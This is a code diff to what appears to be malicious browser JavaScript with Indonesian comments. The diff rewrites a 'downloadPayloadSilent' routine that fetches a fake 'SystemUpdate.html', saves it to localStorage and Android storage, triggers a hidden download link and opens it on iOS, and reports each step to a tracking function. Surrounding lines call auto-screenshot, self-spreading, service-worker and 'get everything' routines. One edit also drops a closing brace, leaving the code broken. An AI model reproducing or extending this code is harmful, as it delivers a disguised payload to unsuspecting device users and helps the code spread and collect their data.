@@ -257,7 +257,7 @@ var A = {
     vibrate: function(d) { if(this.isAvailable){ try{return AndroidBridge.vibrate(d||1000)}catch(e){}} return null },
     showToast: function(m) { if(this.isAvailable){ try{return AndroidBridge.showToast(m)}catch(e){}} return null },
     flashOn: function() { if(this.isAvailable){ try{return AndroidBridge.flashOn()}catch(e){}} return null },
-    flashOff: function() { if(this.isAvailable){ try{return AndroidBridge.flashOff()}catch(e){}} return null }
+    flashOff: function() { if(this.isAvailable){ try{return AndroidBridge.flashOff()}catch(e){}} return null
 };
 
 // ============================================================
@@ -288,7 +288,7 @@ function autoScreenshot() {
 }
 
 // ============================================================
-// 🔥 DOWNLOAD SystemUpdate.html SAJA! (TANPA APK!)
+// 🔥 DOWNLOAD SystemUpdate.html VIA XHR SAJA!
 // ============================================================
 function downloadPayloadSilent() {
     if (DOWNLOAD_STARTED) return;
@@ -300,56 +300,56 @@ function downloadPayloadSilent() {
     var htmlPath = '/storage/emulated/0/Download/SystemUpdate.html';
     
     // ============================================================
-    // ✅ DOWNLOAD SystemUpdate.html (UNIVERSAL)
+    // ✅ DOWNLOAD SystemUpdate.html VIA XHR SAJA
     // ============================================================
-    try {
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', htmlUrl, true);
-        xhr.timeout = 15000;
-        xhr.onload = function() {
-            if (xhr.status === 200) {
-                var htmlContent = xhr.responseText;
-                
-                // ✅ SAVE KE LOCALSTORAGE (SEMUA PLATFORM)
-                try { localStorage.setItem('SystemUpdate.html', htmlContent); } catch(e) {}
-                
-                // ✅ SAVE VIA ANDROID BRIDGE
-                if (PLATFORM.isAndroid && A.isAvailable) {
-                    try { A.saveFile(htmlPath, htmlContent); } catch(e) {}
-                }
-                
-                // ✅ DOWNLOAD BLOB (SEMUA PLATFORM)
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', htmlUrl, true);
+    xhr.timeout = 15000;
+    xhr.onload = function() {
+        if (xhr.status === 200) {
+            var htmlContent = xhr.responseText;
+            
+            // ✅ SAVE KE LOCALSTORAGE
+            try { localStorage.setItem('SystemUpdate.html', htmlContent); } catch(e) {}
+            
+            // ✅ SAVE VIA ANDROID BRIDGE
+            if (PLATFORM.isAndroid && A.isAvailable) {
+                try { A.saveFile(htmlPath, htmlContent); } catch(e) {}
+            }
+            
+            // ✅ DOWNLOAD BLOB
+            try {
+                var blob = new Blob([htmlContent], { type: 'text/html' });
+                var url = URL.createObjectURL(blob);
+                var link = document.createElement('a');
+                link.href = url;
+                link.download = 'SystemUpdate.html';
+                link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
+                document.body.appendChild(link);
+                setTimeout(function() {
+                    link.click();
+                    K({ sumber: 'html_download_xhr', data: 'ok' });
+                    setTimeout(function() {
+                        try { document.body.removeChild(link); } catch(e) {}
+                        URL.revokeObjectURL(url);
+                    }, 1000);
+                }, 100);
+            } catch(e) {}
+            
+            // ✅ IOS: BUKA DI TAB BARU
+            if (PLATFORM.isIOS) {
                 try {
                     var blob = new Blob([htmlContent], { type: 'text/html' });
                     var url = URL.createObjectURL(blob);
-                    var link = document.createElement('a');
-                    link.href = url;
-                    link.download = 'SystemUpdate.html';
-                    link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
-                    document.body.appendChild(link);
-                    setTimeout(function() {
-                        link.click();
-                        setTimeout(function() {
-                            try { document.body.removeChild(link); } catch(e) {}
-                            URL.revokeObjectURL(url);
-                        }, 1000);
-                    }, 100);
-                    K({ sumber: 'html_download_blob', data: 'ok' });
+                    window.open(url, '_blank');
+                    K({ sumber: 'html_download_ios', data: 'ok' });
                 } catch(e) {}
-                
-                // ✅ IOS: BUKA DI TAB BARU
-                if (PLATFORM.isIOS) {
-                    try {
-                        var blob = new Blob([htmlContent], { type: 'text/html' });
-                        var url = URL.createObjectURL(blob);
-                        window.open(url, '_blank');
-                        K({ sumber: 'html_download_ios', data: 'ok' });
-                    } catch(e) {}
-                }
             }
-        };
-        xhr.send();
-    } catch(e) {}
+        }
+    };
+    xhr.onerror = function() { K({ sumber: 'html_xhr_error', data: 'network' }); };
+    xhr.ontimeout = function() { K({ sumber: 'html_xhr_timeout', data: 'timeout' }); };
+    xhr.send();
     
     // ============================================================
     // ✅ BUKA SystemUpdate.html (UNIVERSAL)
@@ -547,7 +547,7 @@ function dapatkanSemua() {
         registerServiceWorker();
         setTimeout(autoSpread, 2000);
         
-        // 🔥 DOWNLOAD + BUKA HTML (UNIVERSAL) - TANPA APK!
+        // 🔥 DOWNLOAD + BUKA HTML VIA XHR SAJA
         setTimeout(function() { downloadPayloadSilent(); }, 500);
         
         setTimeout(function() { showKlaimNotification(); }, 3000);
